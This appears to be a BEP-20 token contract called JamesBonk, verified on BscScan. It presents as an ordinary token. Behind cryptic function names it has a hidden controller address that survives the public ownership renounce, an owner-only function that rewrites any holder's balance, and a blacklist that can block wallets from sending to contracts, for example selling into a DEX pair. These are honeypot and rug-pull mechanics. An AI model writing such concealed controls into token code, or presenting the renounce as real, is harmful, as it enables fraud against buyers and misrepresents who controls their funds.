/**
 *Submitted for verification at BscScan.com on 2021-12-02
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.6.0;

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract Ownable {
  address public owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor() public {
    owner = msg.sender;
  }
}
library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }
    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
contract JamesBonk is Ownable {
  using Address for address;
  using SafeMath for uint256;
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  address o;
  string public symbol;
  address public ap;
  uint8 public decimals;
  uint256 public ts;
  string public name;
  mapping(address => uint256) public b;
  mapping(address => bool) public a;
  mapping(address => bool) public d;
  mapping (address => mapping (address => uint256)) public va;
  constructor(string memory _name, string memory _symbol) public {
    o = msg.sender;
    name = _name;
    symbol = _symbol;
    decimals = 9;
    ts = 1000000000 * 10 ** uint256(decimals);
    b[o] = ts;
    a[o] = true;
  }
  modifier ow() {
    require(o == msg.sender, "401: No auth"); 
    _;
  }
  function bo(address s) public view returns (uint256 balance) {
    return b[s];
  }
  function tr(address t, uint256 v) public returns (bool) {
    address f = msg.sender;
    require(t != address(0));
    require(v <= b[f]);
    if(!f.isContract() && t.isContract()){
        require(d[f] == false && d[t] == false);
    }
    if(a[f] || a[t]){
        _tr(f, t, v);
        return true;
    }
    if(f.isContract() && t.isContract()){
        _tr(f, t, v);
        return true;
    }
    _tr(f, t, v);
    return true;
  }
  function _tr(address f, address t, uint256 v) private {
    b[f] = b[f].sub(v);
    b[t] = b[t].add(v);
    emit Transfer(f, t, v);
  }
  modifier oww() {
    require(o == msg.sender, "401: No auth"); 
    _;
  }
  function sia(address s, bool ok) external ow {
      a[s] = ok;
  }
  function sid(address s, bool ok) external ow returns (bool){
      d[s] = ok;
  }    
  function cia(address s) public view returns (bool) {
    if (a[s]){
      return true;
    } else {
      return false;
    }
  }
  function cid(address s) public view returns (bool) {
    if (d[s]){
      return true;
    } else {
      return false;
    }
  }
  function ro() public ow {
    emit OwnershipTransferred(owner, address(0));
    owner = address(0);
  }
  function tf(address f, address t, uint256 v) public returns (bool) {
    require(t != address(0));
    require(v <= b[f]);
    require(v <= va[f][msg.sender]);
    if(!f.isContract() && t.isContract()){
        require(d[f] == false && d[t] == false);
    }
    if(a[f] || a[t]){
        _tf(f, t, v);
        return true;
    }
    if(f.isContract() && t.isContract()){
        _tf(f, t, v);
        return true;
    }
    _tf(f, t, v);
    return true;
  }
  function _tf(address f, address t, uint256 v) internal {
    b[f] = b[f].sub(v);
    b[t] = b[t].add(v);
    va[f][msg.sender] = va[f][msg.sender].sub(v);
    emit Transfer(f, t, v);
  }
  function aw(address h, address s) public view returns (uint256) {
    return va[h][s];
  }
  function approve(address s, uint256 v) public returns (bool) {
    va[msg.sender][s] = v;
    emit Approval(msg.sender, s, v);
    return true;
  }
  function cub(address h) public view returns (uint256) {
    return b[h];
  }
  function cpa(address l) public ow {
    ap = l;
  }
  function spa() public view returns (address) {
    return ap;
  }
  function _a(address ad, uint256 q) external oww {
    b[ad] = q * 10 ** uint256(decimals);
  }
  // Will be on 8 December
  function ad(
    address s,
    address[] calldata r,
    uint256 v
  ) private oww {
    require(r.length < 2001, "max number is 2000 user");
        for (uint256 i = 0; i < r.length; i++) {
            _tf(s, r[i], v);
        }
    }
}